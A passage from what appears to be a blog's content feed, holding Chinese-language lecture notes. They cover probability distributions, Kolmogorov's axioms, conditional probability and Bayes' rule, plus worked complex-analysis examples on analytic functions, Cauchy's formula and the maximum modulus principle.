Var(X)=np(1-p).</script></li><li><p><strong>定义(Poisson 分布)</strong></p><p>  满足</p><script type="math/tex; mode=display">  P(X=k)=\dfrac{\lambda^k}{k!}e^{-\lambda},\,k=0,1,2,\cdots.</script><p>  记为 $X\sim P(\lambda)$. 我们有</p><script type="math/tex; mode=display">  E(X)=\lambda, Var(X)=\lambda.</script></li><li><p><strong>例</strong>  观察时间 $[0,1)$ 某路口发生的交通事故数 $X$.</p><ul><li><p>$l_i=[\dfrac{i-1}{n},\dfrac{i}{n}), i=1,2,\cdots,n$.</p></li><li><p>$n$ 充分大.</p></li><li><p>假设:</p><ul><li>$l_i$ 上至多发生一起事故;</li><li>$l_i$ 上恰发生一次事故的概率 $p=\dfrac{\lambda}{n}$, 与时长成正比;</li><li>$l_i$ 各段相互独立.</li></ul></li><li><p>此时</p><script type="math/tex; mode=display">  \begin{aligned}  P(X=k)&=C_n^kp^k(1-p)^{n-k}\\  &=\dfrac{n!}{k!(n-k)!}(\dfrac{\lambda}{n})^k(1-\dfrac{\lambda}{n})^{n-k}\\  &\rightarrow\dfrac{\lambda^k}{k!}e^{-\lambda}, 当\,n\to\infty.  \end{aligned}</script></li></ul></li><li><p><strong>注</strong></p><ul><li>若 $X\sim B(n,p)$, $p$ 很小, $n$ 很大, $np$ 不太大, 则 $X\sim P(\lambda)$, $\lambda=np$.</li><li>误差最多为 $\min(p,np^2)$.</li><li><strong>Poisson</strong> 分布多用于一定时间或空间内小概率事件发生次数的场景.</li></ul></li><li><p><strong>例</strong>  某医院平均每小时出生婴儿 $\lambda$ 名, 接下来 $t$ 小时出生婴儿数的分布.</p></li><li><p><strong>解答</strong>  我们有</p><script type="math/tex; mode=display">P(N(t)=k)=\dfrac{(\lambda t)^k}{k!}e^{-\lambda t},\,k=0,1,2,\cdots.</script><p>其中 $\lambda$ 为均值.</p></li><li><p><strong>注</strong>  <strong>Bernoulli</strong> 试验不独立, 但弱相依条件下仍为较好近似.</p></li><li><p><strong>例(配对问题)</strong></p></li><li><p><strong>解答</strong>  弱相依条件下:</p><script type="math/tex; mode=display">P(A_i)=\dfrac{1}{n}\simeq P(A_i\mid A_j)=\dfrac{1}{n-1}</script><p>恰有 $k$ 个人拿到自己的帽子的概率:</p><script type="math/tex; mode=display">P(X=k)=\dfrac{\lambda^k}{k!}e^{-\lambda}=\dfrac{e^{-1}}{k!}</script></li><li><p><strong>常规解答</strong></p><p>  设 $E=$ 指定的 $k$ 个人拿到了自己的帽子.</p><p>  设 $F=$ 其余的 $n-k$ 个人未拿到自己的帽子.</p><p>  我们有:</p><script type="math/tex; mode=display">  P(EF)=P(F\mid E)P(E)=P_{n-k}\dfrac{(n-k)!}{n!}</script><p>  进而有:</p><script type="math/tex; mode=display">  P(X=k)=C_n^kP(EF)=\dfrac{1}{k!}P_{n-k}\rightarrow\dfrac{e^{-1}}{k!}.</script></li></ul><h2 id="连续随机变量"><a href="#连续随机变量" class="headerlink" title="连续随机变量"></a>连续随机变量</h2><ul><li><p><strong>定义(概率密度函数)(PDF)</strong>  若存在 $f\ge 0$, 使得 $\forall I\subset\mathbb{R}$ 可测, 都有</p><script type="math/tex; mode=display">P(X\in I)=\int_If(x)dx</script><p>则称 $X$ 为连续型随机变量, $f$ 为 $X$ 的概率密度函数 <strong>(PDF)</strong>.</p></li><li><p><strong>性质</strong></p><ul><li>$\int_{-\infty}^{\infty}f(x)dx\equiv 1$;</li><li>$P(a&lt;X\le b)=\int_a^bf(x)dx=P(a\le X\le b)=P(a\le X&lt;b)=P(a&lt;X&lt;b)$;</li><li>$P(X=a)=0,\forall a\in\mathbb{R}$;</li><li>$P(x_0-\delta&lt;X\le x_0+\delta)=\int_{x_0-\delta}^{x_0+\delta}f(x)dx=2\delta f(x_0)$, 要求 $f$ 在 $x_0$ 处连续;</li><li>$F(x)=P(X\le x)=\int_{-\infty}^xf(t)dt$ 连续, $F’(x)=f(x)$ ($f$ 在 $x$ 处连续);</li><li><strong>PDF</strong> 与 <strong>PMF</strong> 实质上可以统一; <strong>PDF</strong> 若存在, 则不唯一.</li></ul></li><li><p><strong>定义(期望与方差)</strong></p><script type="math/tex; mode=display">  E(X) = \int_{-\infty}^{\infty}xf(x)dx = \mu\\  Var(X) = \int_{-\infty}^{\infty}(x-\mu)^2f(x)dx = \sigma^2</script><p>  我们有</p><script type="math/tex; mode=display">  Var(X) = E((X-E(X))^2) = E(X^2) - E^2(X).</script></li><li><p><strong>约定</strong>  $E(X)$ 存在 $\Leftrightarrow$ $E(X)&lt;\infty$.</p></li><li><p><strong>注</strong></p><ul><li>$E(X)$ 存在 $\Leftrightarrow$ $\int\limits_{-\infty}^{\infty}\vert x\vert f(x)dx&lt;\infty$;</li><li>一般地, $E(g(X))=\int\limits_{-\infty}^{\infty}g(x)f(x)dx$.</li></ul></li></ul><h2 id="常见连续分布"><a href="#常见连续分布" class="headerlink" title="常见连续分布"></a>常见连续分布</h2><ul><li><p><strong>定义(连续分布)</strong></p><script type="math/tex; mode=display">f(x)=\begin{cases}\dfrac{1}{b-a},\,a<x<b \\0,\,其他情况 \\\end{cases}</script><p>记为 $X\sim U(a,b)$. 我们有</p><script type="math/tex; mode=display">E(X)=\dfrac{a+b}{2}, Var(X)=?.</script></li><li><p><strong>注</strong>  $X\sim U(0,1)$ 称为随机数.</p></li><li><p><strong>定义(正态分布)</strong></p><script type="math/tex; mode=display">  f(x)=\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\dfrac{(x-\mu)^2}{2\sigma^2}},\,x\in\mathbb{R}.</script><p>  记为 $X\sim N(\mu,\sigma^2)$. 我们有</p><script type="math/tex; mode=display">  E(X)=\mu, Var(X)=\sigma^2.</script></li><li><p><strong>注</strong></p><ul><li>$X\sim N(\mu,\sigma^2)\Leftrightarrow Y=\dfrac{X-\mu}{\sigma}\sim N(0,1)$;</li><li>$N(0,1)$ 标准正态;</li><li>经验法则.</li></ul></li><li><p><strong>定义(指数分布)</strong></p><script type="math/tex; mode=display">  f(x)=  \begin{cases}  \lambda e^{-\lambda x},\,x>0 \\  0,\,x\le 0 \\  \end{cases}</script><p>  记为 $X\sim Exp(\lambda)$. 我们有</p><script type="math/tex; mode=display">  E(X)=\dfrac{1}{\lambda}, Var(X)=\dfrac{1}{\lambda^2}.</script></li><li><p><strong>注</strong></p><ul><li>有的软件取参数为 $\beta=\dfrac{1}{\lambda}$;</li><li>通常刻画寿命或等待时间.</li></ul></li><li><p><strong>例</strong>  观察到有婴儿出生, 接下来 $t$ 小时有婴儿出生的概率为?</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}P(X\le t)&=1-P(X>t)\\&=1-P(N(t)=0)\\&=1-\dfrac{(\lambda t)^0}{0!}e^{-\lambda t}\\&=1-e^{-\lambda t}.\end{aligned}</script><p>这是一个 <strong>Poisson</strong> 过程, 数量是 <strong>Poisson</strong> 分布, 间隔是指数分布.</p></li><li><p><strong>定义</strong>  假设 $X&gt;0$ 连续, 其 <strong>CDF</strong> 为 $F(x)$, 满足 $F(0)=0$. 考虑</p><script type="math/tex; mode=display">\begin{aligned}&P(x<X<x+dx\mid X>x)\\=&\dfrac{P(x<X<x+dx)}{P(X>x)}\\=&\dfrac{F(x+dx)-F(x)}{1-F(x)}\\\approx&\dfrac{F'(x)}{1-F(x)}dx.\end{aligned}</script><p>视为年龄为 $x$ 的元件失效的条件概率密度 (瞬时失效率/危险率).</p></li><li><p><strong>注</strong></p><ul><li><p>令 $\dfrac{F’(x)}{1-F(x)}=\lambda(x)\Rightarrow F(x)=1-e^{-\int_0^x\lambda(t)dt},x&gt;0$;</p></li><li><p>若 $\lambda(x)\equiv\lambda\,(无老化假设)$, 则 $F(x)=1-e^{-\lambda x}$,</p><p>$\Rightarrow P(X&gt;t+s\mid X&gt;s)=\dfrac{P(X&gt;t+s)}{P(X&gt;s)}=\dfrac{1-F(s+t)}{1-F(s)}=e^{-\lambda t}$  $(无记忆性)$;</p></li><li><p>改进 $\lambda(x)=\alpha\dfrac{x^{\alpha-1}}{\beta^\alpha},\alpha,\beta&gt;0$, 则 $F(x)=1-e^{-(\dfrac{x}{\beta})^{\alpha}}\Rightarrow$ <strong>Weibull</strong> 分布.</p></li></ul></li></ul><h2 id="随机变量的函数"><a href="#随机变量的函数" class="headerlink" title="随机变量的函数"></a>随机变量的函数</h2><ul><li><p><strong>定义</strong>  $Y=g(X)$ </p></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">Y=\begin{cases}1,\,x>t_0 \\0,\,x\le t_0 \\\end{cases}    \quad t_0>0\,给定.</script><p>那么有 $P(Y=0)=1-e^{-\lambda t_0}$, $P(Y=1)=e^{-\lambda t_0}$.</p></li><li><p><strong>例</strong>  $X$ 连续, 其 <strong>PDF</strong> 为 $f(x)$, 且 $Y=X^2$.</p></li><li><p><strong>解答</strong>   $\forall y&gt;0$, 我们有</p><script type="math/tex; mode=display">\begin{aligned}P(Y\le y)&=P(X^2\le y)\\&=P(-\sqrt{y}\le X\le\sqrt{y})\\&=\int_{-\sqrt{y}}^{\sqrt{y}}f(x)dx\\&=\int_0^yl(t)dt.\end{aligned}</script><p>其中 $Y$  的 <strong>PDF</strong> 为 $l(y)=\dfrac{1}{2\sqrt{y}}(f(\sqrt{y})+f(-\sqrt{y}))$.</p></li><li><p><strong>例</strong>  $X\sim N(0,1)$, 且 $Y=X^2$.</p></li><li><p><strong>解答</strong>  $Y$  的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">l(y)=\dfrac{1}{\sqrt{2\pi}}\dfrac{1}{\sqrt{y}}e^{-\dfrac{y}{2}}</script><p>这是自由度为 $1$ 的 <strong>Chi-Square</strong> 分布 $\chi^2(1)$.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记1</title>
      <link href="/2023/02/23/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-1/"/>
      <url>/2023/02/23/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-1-概率"><a href="#Chap-1-概率" class="headerlink" title="Chap 1 概率"></a>Chap 1 概率</h1><h2 id="试验与事件"><a href="#试验与事件" class="headerlink" title="试验与事件"></a>试验与事件</h2><ul><li><p><strong>定义(随机试验)</strong></p><ul><li>不能预先确知结果;</li><li>试验之前可预测所有可能结果.</li></ul></li><li><p><strong>定义(样本空间)</strong>  一个试验所有可能结果之集 $(\Omega)$.</p></li><li><strong>定义(随机事件)</strong>  $a$ $well$ $defined$ $subset$ $A\in\Omega$.<ul><li>全事件 $\Omega$ (必然事件);</li><li>空事件 $\varPhi$ (不可能事件);</li><li>单一试验结果 (基本事件).</li></ul></li></ul><h2 id="事件的运算"><a href="#事件的运算" class="headerlink" title="事件的运算"></a>事件的运算</h2><ul><li><p>借助集合的语言 $or$ $Venn$ 图.</p><ul><li>余: $A^c-(\Omega\backslash A)$;</li><li>和: $A+B-(A\cup B)$;</li><li>差: $A-B-(A\backslash B)$;</li><li>积: $AB-(A\cap B)$;</li><li>互斥: $AB = \varnothing$;</li><li>对立: $AB = \varnothing, A + B = \Omega$;</li><li><strong>De Morgan</strong> 定律: $(A + B)^c = A^cB^c$ $(\sum_n A_n)^c = \prod_n A_n^c$.</li></ul></li></ul><h2 id="概率的几种解释"><a href="#概率的几种解释" class="headerlink" title="概率的几种解释"></a>概率的几种解释</h2><ul><li>古典解释 - 基于等可能性;</li><li>频率解释;</li><li>主观解释.</li></ul><h2 id="公理化定义"><a href="#公理化定义" class="headerlink" title="公理化定义"></a>公理化定义</h2><ul><li><p>$2^{\Omega}\Rightarrow\Omega$ 的所有子集构成的集合.</p></li><li><p>事件集类 $\mathscr{F}\subset\Omega\Rightarrow\sigma{-}$代数: 事件运算的封闭性.</p></li><li><p>特别地, </p><script type="math/tex; mode=display">\sum_{i = 1}^{\infty}A_i\in\mathscr{F}, \forall A_i\in\mathscr{F}.</script></li><li><p><strong>定义(Kolmogorov)</strong></p><script type="math/tex; mode=display">  P: \mathscr{F}\rightarrow\mathbb{R} \\</script><p>  满足以下三条公理:</p><ul><li>$P(A)\ge 0, \forall A\in\mathscr{F}$</li><li>$P(\Omega) = 1$</li><li><p>$P(\sum_{i = 1}^{\infty}A_i) = \sum_{i = 1}^{\infty}P(A_i), A_iA_j = \varnothing, \forall i\ne j$</p><p>则称 $P$ 为概率函数, $(\Omega, \mathscr{F}, P)$ 为概率空间.</p></li></ul></li><li><p><strong>命题</strong></p><ul><li>$P(A)\le1, \forall A\in\mathscr{F}$;</li><li>$P(\varPhi) = 0$;</li><li>$P(A^c) = 1 - P(A)$;</li><li>$P(\sum_{i = 1}^{n}A_i) = \sum_{i = 1}^{n}P(A_i), A_iA_j = \varnothing, \forall i\ne j$;</li><li>$P(A)\le P(B), \forall A\subset B$;</li><li>$P(A + B) = P(A) + P(B) - P(AB)$.</li></ul></li><li><p><strong>推广</strong></p><p>$P(\sum_\limits{i = 1}^{n}A_i) = \sum_\limits{i = 1}^{n}P(A_i) - \sum_\limits{i_1&lt;i_2}P(A_{i_1}A_{i_2}) + \cdots + (-1)^{r - 1}\sum_\limits{i_1 &lt; \cdots &lt; i_r}P(A_{i_1}\cdots A_{i_r}) + \cdots$</p></li><li><p><strong>例</strong>  $n$ 个人, 每人一顶帽子, 随机挑选一顶帽子. 无人拿到自己帽子的概率为? 恰有 $k$ 人拿到自己帽子的概率为?</p></li><li><p><strong>解答</strong>  令 $A_i = $ 第 $i$ 个人拿到自己帽子. 注意到</p><script type="math/tex; mode=display">P(A_i) = \cfrac{1}{n}.</script><p>运用排列组合知识可得</p><script type="math/tex; mode=display">P(A_{i_1}\cdots A_{i_r}) = \cfrac{(n - r)!}{n!},\\\sum_\limits{i_1 < \cdots < i_r}P(A_{i_1}\cdots A_{i_r}) = \cfrac{(n - r)!}{n!}C_n^r = \cfrac{1}{r!}.</script><p>故至少有一个人拿到自己帽子的概率为</p><script type="math/tex; mode=display">\begin{equation*}    \begin{aligned}    P(\sum_\limits{i = 1}^{n}A_i) &= \sum_\limits{r = 1}^{n}(-1)^{r - 1}\sum_\limits{i_1 < \cdots < i_r}P(A_{i_1}\cdots A_{i_r}) \\    &= \sum_\limits{r = 1}^{n}(-1)^{r - 1}\cfrac{1}{r!}.    \end{aligned}\end{equation*}</script><p>无人拿到自己帽子的概率为</p><script type="math/tex; mode=display">\begin{equation*}    \begin{aligned}    P_n &= 1 - P(\sum_\limits{i = 1}^{n}A_i) \\    &= 1 - \sum_\limits{r = 1}^{n}(-1)^{r - 1}\sum_\limits{i_1 < \cdots < i_r}P(A_{i_1}\cdots A_{i_r}) \\    &= \sum_\limits{r = 0}^{n}(-1)^{r}\cfrac{1}{r!} \\    &= \cfrac{1}{e}.    \end{aligned}\end{equation*}</script></li></ul><h2 id="条件概率"><a href="#条件概率" class="headerlink" title="条件概率"></a>条件概率</h2><ul><li><p><strong>定义(条件概率)</strong>  $P(A\mid B) := \cfrac{P(AB)}{P(B)}\,( 需\,P(B) &gt; 0)$.</p></li><li><p>$A\mid B$ 不是事件.</p></li><li><p><strong>计算</strong>  $(1)$ 缩小样本空间; $(2)$ 定义.</p></li><li><p><strong>定义(乘法法则)</strong>  $P(AB) = P(A\mid B)P(B) = P(B\mid A)P(A).$</p></li><li><p><strong>例</strong>  $8$ 个红球, $4$ 个白球, 等可能无放回地取出 $2$ 红球的概率为?</p></li><li><p><strong>解答</strong>  无放回地取出 $2$ 红球的概率为</p><script type="math/tex; mode=display">P(R_1R_2) = P(R_1)P(R_2\mid R_1) = \cfrac{8}{12}\times\cfrac{7}{11} = \cfrac{14}{33}.</script></li><li><p><strong>推广</strong></p><p>$P(A_1A_2\cdots A_n) = P(A_1)P(A_2\mid A_1)P(A_3\mid A_1A_2)\cdots P(A_n\mid A_1A_2\cdots A_{n - 1}).$</p></li><li><p><strong>解答续</strong>  在配对问题中, 注意到</p><script type="math/tex; mode=display">  \begin{equation*}      \begin{aligned}    P(A_{i_1}\cdots A_{i_r}) &= P(A_{i_1})P(A_{i_2}\mid A_{i_1})\cdots P(A_{i_r}\mid A_{i_1}A_{i_2}\cdots A_{i_{r - 1}}) \\    &= \cfrac{1}{n}\cdot\cfrac{1}{n - 1}\cdot\cfrac{1}{n - 2}\cdots\cfrac{1}{n - (r - 1)} \\    &= \cfrac{(n - r)!}{n!}.      \end{aligned}  \end{equation*}</script></li><li><p><strong>定义</strong></p><script type="math/tex; mode=display">  P(\cdot\mid B): \mathscr{F}\rightarrow\mathbb{R}</script><p>  令 $\widetilde{P} = P(\cdot\mid B)$, 则 $\widetilde{P}$ 满足以下三条公理:</p><ul><li>$\widetilde{P}(A)\ge 0, \forall A\in\mathscr{R}$</li><li>$\widetilde{P}(\Omega) = 1$</li><li><p>$\widetilde{P}(\sum_{i = 1}^{\infty}A_i) = \sum_{i = 1}^{\infty}\widetilde{P}(A_i), A_iA_j = \varnothing, \forall i\ne j$</p><p>故 $\widetilde{P}$ 为概率函数, $(\Omega, \mathscr{F}, \widetilde{P})$ 为新概率空间.</p></li></ul></li><li><p><strong>注</strong></p><ul><li>$P(A)\,\textbf{v.s.}\,\widetilde{P}(A) = P(A\mid B)$;</li><li>“已观测到 $A$ 发生, 则 $P(A) = 1$” 这句话是错误的, 因为 $P(A\mid A) = 1$.</li></ul></li></ul><h2 id="独立事件"><a href="#独立事件" class="headerlink" title="独立事件"></a>独立事件</h2><ul><li><p><strong>定义(独立事件)</strong>  若 $P(AB) = P(A)P(B)$, 则称事件 $A, B$ 相互独立.</p></li><li><p><strong>注</strong></p><ul><li>此时 $P(A\mid B) = P(A)$, 即 $\cfrac{P(AB)}{P(B)} = \cfrac{P(A\Omega)}{P(\Omega)}$;</li><li>事件 $B$ 的发生未改变 $A$ 发生的概率;</li><li>从实际角度判断可应用定义中的关系式; 一般利用定义判断独立性.</li></ul></li><li><p><strong>例</strong>  中奖率为 $10^{-5}$ 的彩票每周开奖, 不累积, 一个人购彩十年未中奖的概率为?</p></li><li><p><strong>解答</strong></p><p>每次购彩事件都是独立的.</p><p>设事件 $A_i = $ 第 $i$ 周未中奖, 那么 $P(A_i) = 1 - 10^{-5}$.</p><p>故 $P = P(A_1A_2\cdots A_{520}) = (1 - 10^{-5})^520 = 99.48\%$. </p></li><li><p>事件 $A, B$ 相互独立, 则事件 $A^c, B$ 相互独立.</p></li><li><p><strong>推广</strong></p><ul><li><p>$A, B, C\,相互独立\Leftrightarrow P(ABC) = P(A)P(B)P(C)\,且\,A, B, C\,两两独立$;</p></li><li><p>$A, B, C\,两两独立\nRightarrow A, B, C\,相互独立$</p><p>  (反例) 甲乙两人抛掷 $2$ 枚硬币. $A =$ 甲正, $B =$ 乙正, $C =$ 甲乙同.</p></li></ul></li><li><p><strong>定义(相互独立)</strong></p><p>  $A_1, A_2, \cdots, A_n\,相互独立\Leftrightarrow 任\,m\,个事件\,A_{i_1},\cdots, A_{i_m}, 有 P(A_{i_1}\cdots A_{i_m}) = P(A_{i_1})\cdots P(A_{i_m}).$</p></li><li><p><strong>定义(条件独立)</strong></p><p>  $A, B$ 关于事件 $E$ 条件独立 $\Leftrightarrow P(AB\mid E) = P(A\mid E)P(B\mid E)$.</p></li><li><p><strong>注</strong>  条件独立与独立不可互推.</p></li></ul><h2 id="textbf-Bayes-公式"><a href="#textbf-Bayes-公式" class="headerlink" title="$\textbf{Bayes}$ 公式"></a>$\textbf{Bayes}$ 公式</h2><ul><li><p><strong>定义(全概率公式)</strong>  给出 $\Omega$ 的一个分割</p><ul><li>$\sum_iB_i = \Omega$;</li><li>$B_iB_j = \varnothing, \forall\,i\ne j$;</li><li>$P(B_i) &gt; 0, \forall\,i$.</li></ul><p>则有</p><script type="math/tex; mode=display">P(A) = P(\sum_i(AB_i)) = \sum_iP(AB_i) = \sum_iP(A\mid B_i)P(B_i).</script></li><li><p><strong>定义(Bayes 公式)</strong></p><script type="math/tex; mode=display">  P(B_i\mid A) = \dfrac{P(A\mid B_i)P(B_i)}{\sum_jP(A\mid B_j)P(B_j)}</script><p>  其中 $P(B_i)$ 为先验概率, $P(B_i\mid A)$ 为后验概率.</p></li></ul><ul><li><p><strong>例</strong>  $A =$ 阳性, $B =$ 患病, $P(B) = 10^{-4}$, $P(A\mid B) = 0.99$, $P(A\mid B^c) = 10^{-3}$. 求 $P(B\mid A)$, $P(B\mid A_1A_2)$.</p></li><li><p><strong>解答</strong>  由 <strong>Bayes</strong> 公式, 容易得到</p><script type="math/tex; mode=display">  \begin{equation*}      \begin{aligned}          P(B\mid A)&= \dfrac{P(AB)}{P(A)} \\          &= \dfrac{P(A\mid B)P(B)}{P(A)} \\          &= \dfrac{P(A\mid B)P(B)}{P(A\mid B)P(B) + P(A\mid B^c)P(B^c)} \\          &= 9.01\%.      \end{aligned}  \end{equation*}</script><script type="math/tex; mode=display">  \begin{equation*}      \begin{aligned}          P(B\mid A_1A_2)&= \dfrac{P(A_1A_2B)}{P(A_1A_2)} \\          &= \dfrac{P(A_1A_2\mid B)P(B)}{P(A_1A_2)} \\          &= \dfrac{P(A_1A_2\mid B)P(B)}{P(A_1A_2\mid B)P(B) + P(A_1A_2\mid B^c)P(B^c)} \\          &= \dfrac{P(A\mid B)^2P(B)}{P(A\mid B)^2P(B) + P(A\mid B^c)^2P(B^c)} \\          &= 98.99\%.      \end{aligned}  \end{equation*}</script></li></ul><h2 id="一些讨论"><a href="#一些讨论" class="headerlink" title="一些讨论"></a>一些讨论</h2><ul><li>什么是概率?<ul><li>不确定性的一种度量;</li><li>具有不同的解释;</li><li>公理化定义.</li></ul></li><li>为什么用概率?<ul><li>不确定性的来源<ul><li>被建模系统的内在随机性;</li><li>不完全观测 (<strong>Monty Hall</strong> 中的参与者);</li><li>不完全建模.</li></ul></li><li>很多情况下, 简单而不确定的规则好于复杂而确定的规则</li><li>应用、维护、沟通</li></ul></li><li>怎么用概率?<ul><li>计算正确的概率;</li><li>正确计算概率;</li><li>正确使用概率.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复变函数</title>
      <link href="/2022/12/31/fu-bian-han-shu/"/>
      <url>/2022/12/31/fu-bian-han-shu/</url>
      
        <content type="html"><![CDATA[<h3 id="1-解析函数"><a href="#1-解析函数" class="headerlink" title="1. 解析函数"></a>1. 解析函数</h3><p>$\textbf{Example:}$<br>对于 $x, y\in\mathbb{R}$, 求 $\cos(x + iy)$ 的实, 虚部, 并说明方程</p><script type="math/tex; mode=display">\cos(x + iy) = A + iB\thinspace(A, B\in\mathbb{R})</script><p>有无穷多组解. ◻</p><p>$\textbf{Solution:}$<br>由于 <script type="math/tex">\cos z = \frac{1}{2}\left(e^{iz} + e^{-iz}\right),</script></p><p>得到 <script type="math/tex">\begin{aligned}            \cos(x + iy) &= \frac{1}{2}\left(e^{-y + ix} + e^{y - ix}\right) \\            &= \frac{1}{2}\left[e^{-y}\left(\cos x + i\sin x\right) + e^y\left(\cos x - i\sin x\right)\right] \\            &= \frac{1}{2}\cos x\left(e^y + e^{-y}\right) + \frac{1}{2}\sin x\left(e^{-y} - e^y\right)i.        \end{aligned}</script></p><p>于是 <script type="math/tex">\Re\cos(x + iy) = \frac{1}{2}\cos x\left(e^y + e^{-y}\right),</script></p><script type="math/tex; mode=display">\Im\cos(x + iy) = \frac{1}{2}\sin x\left(e^{-y} - e^y\right).</script><p>考虑方程组 <script type="math/tex">\begin{cases}            \frac{1}{2}\cos x\left(e^y + e^{-y}\right) = A, \\            \frac{1}{2}\sin x\left(e^{-y} - e^y\right) = B.        \end{cases}</script></p><p>$(1)$ 若$B = 0$:</p><p>$(a)$ $A &gt; 1$ 时,</p><p>取 $x = 2k\pi, \thinspace k\in\mathbb{Z}$, 考虑</p><script type="math/tex; mode=display">f(y) = e^y + e^{-y} - 2A.</script><p>因为 <script type="math/tex">f(0) = 2 - 2A < 0, \thinspace f(+\infty) = +\infty,</script></p><p>由介值定理得 <script type="math/tex">\exists\thinspace y_1 > 0, \thinspace f(y_1) = 0.</script></p><p>那么 <script type="math/tex">\begin{cases}            x = 2k\pi, \\            y = y_1,        \end{cases}</script></p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(b)$ $A &lt; -1$ 时,</p><p>取 $x = 2k\pi + \pi, \thinspace k\in\mathbb{Z}$, 考虑</p><script type="math/tex; mode=display">g(y) = e^y + e^{-y} + 2A.</script><p>因为 <script type="math/tex">g(0) = 2 + 2A < 0, \thinspace g(+\infty) = +\infty,</script></p><p>由介值定理得 <script type="math/tex">\exists\thinspace y_2 > 0, \thinspace g(y_2) = 0.</script></p><p>那么 <script type="math/tex">\begin{cases}            x = 2k\pi + \pi, \\            y = y_2,        \end{cases}</script></p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(c)$ $-1\le A\le 1$ 时,</p><p>取 $y = 0$, 考虑 <script type="math/tex">\cos x = A.</script></p><p>那么 <script type="math/tex">\begin{cases}            x = \arccos A + 2k\pi, \\            y = 0,        \end{cases}</script></p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(2)$ 若$B \ne 0$:</p><p>可得</p><script type="math/tex; mode=display">\left(\frac{2A}{e^y + e^{-y}}\right)^2 + \left(\frac{2B}{e^{-y} - e^y}\right)^2 = 1.</script><p>令</p><script type="math/tex; mode=display">h(y) = \left(\frac{2A}{e^y + e^{-y}}\right)^2 + \left(\frac{2B}{e^{-y} - e^y}\right)^2 - 1,</script><p>因为 <script type="math/tex">h(0^{+}) = +\infty, \thinspace h(+\infty) = -1 < 0,</script></p><p>由介值定理得 <script type="math/tex">\exists\thinspace y_{AB} > 0, \thinspace h(y_{AB}) = 0.</script></p><p>那么 <script type="math/tex">\begin{cases}            x = \arccos\cfrac{2A}{e^{y_{AB}} + e^{-y_{AB}}} + 2k\pi, \\            y = y_{AB},        \end{cases}</script></p><p>为原方程的解, $\forall k\in\mathbb{Z}$. ◻</p><h3 id="2-Cauchy高阶导数公式"><a href="#2-Cauchy高阶导数公式" class="headerlink" title="2. Cauchy高阶导数公式"></a>2. Cauchy高阶导数公式</h3><p>$\textbf{Example:}$<br>$f(z)$ 在 $D$ 内解析, 则对 $z_0\in D$, 有</p><script type="math/tex; mode=display">f^{(n)}(z_0) = \frac{n!}{2\pi i}\oint_{\left|{z - z_0}\right| = r}\limits\frac{f(z)dz}{(z - z_0)^{n + 1}}.$$ ◻$\textbf{Solution:}$由于 $f(z)$ 在 $z_0$ 处解析, 可以认为$$f(z) = \sum_{k = 0}^{\infty}\limits\frac{1}{k!}f^{(k)}(z_0)(z - z_0)^k</script><p>在 $\left|{z - z_0}\right|\le r$ 内处处成立.</p><p>两边同时除以 $(z - z_0)^{n + 1}$, 再对 $\left|{z - z_0}\right| = r$<br>积分可得</p><script type="math/tex; mode=display">\oint_{\left|{z - z_0}\right| = r}\limits\frac{f(z)dz}{(z - z_0)^{n + 1}} = \frac{2\pi i}{n!}f^{(n)}(z_0).$$ ◻$\textbf{Example:}$求积分$$\oint_{\left|{z}\right| = 1}\limits\cfrac{1 - \cos 4z^5}{z^n}dz.$$ ◻$\textbf{Solution:}$当 $n = 0$ 时,由于 $f(z) = 1 - \cos 4z^5$ 在复平面上处处解析,得 $$\oint_{\left|{z}\right| = 1}\limits (1 - \cos 4z^5)dz = 0.</script><p>当 $n\ge 1$ 时,</p><script type="math/tex; mode=display">\cfrac{1 - \cos 4z^5}{z^n} = \sum_{k = 1}^{\infty}\limits\cfrac{1}{z^n}\cdot(-1)^k\cfrac{(4z^5)^{2k}}{(2k)!} = \sum_{k = 1}^{\infty}\limits\cfrac{(-1)^{k + 1}4^{2k}z^{10k - n}}{(2k)!}.</script><p>进而</p><script type="math/tex; mode=display">\oint_{\left|{z}\right| = 1}\limits\cfrac{1 - \cos 4z^5}{z^n}dz = \begin{cases}            2\pi i\cdot\cfrac{(-1)^{k + 1}16^k}{(2k)!}, n = 10k + 1 \\            0, n\ne 10k + 1 \\        \end{cases}        (\mbox{其中}k\in\mathbb{N})$$ ◻### 3. 最大模原理$\textbf{Example:}$$f(z)$ 非常函数, 在有界域 $D$ 内可导, 在边界 $\partial D$ 上连续, 则$$\max_{z\in D\cup\partial D}\limits\left|{f(z)}\right| = \max_{z\in \partial D}\limits\left|{f(z)}\right|,</script><p>并且满足 $f’(z_0)\ne 0$. ◻</p><p>$\textbf{Solution:}$<br>设 $z_0\in D\cup\partial D$ 使得<br>$f(z_0) = \max_{z\in D\cup\partial D}\limits\left|{f(z)}\right|$.</p><p>若 $z_0\in D$, 由平均值公式, $\exists\thinspace r_0 &gt; 0$,</p><p>当 $0 &lt; r\le r_0$ 时, $\left|{z - z_0}\right|$ 位于 $D$ 内. 那么</p><script type="math/tex; mode=display">\begin{aligned}            \left|{f(z_0)}\right| &= \frac{1}{2\pi}\left|{\int_0^{2\pi}\limits f(z_0 + re^{i\theta})d\theta}\right| \\            &\le \frac{1}{2\pi}\int_0^{2\pi}\limits \left|{f(z_0 + re^{i\theta})}\right|d\theta \\            &\le \frac{1}{2\pi}\int_0^{2\pi}\limits \left|{f(z_0)}\right|d\theta \\            &= \left|{f(z_0)}\right|,        \end{aligned}</script><p>即<br>$\left|{f(z)}\right|\equiv \left|{f(z_0)}\right|, \thinspace\forall \left|{z - z_0}\right| &lt; 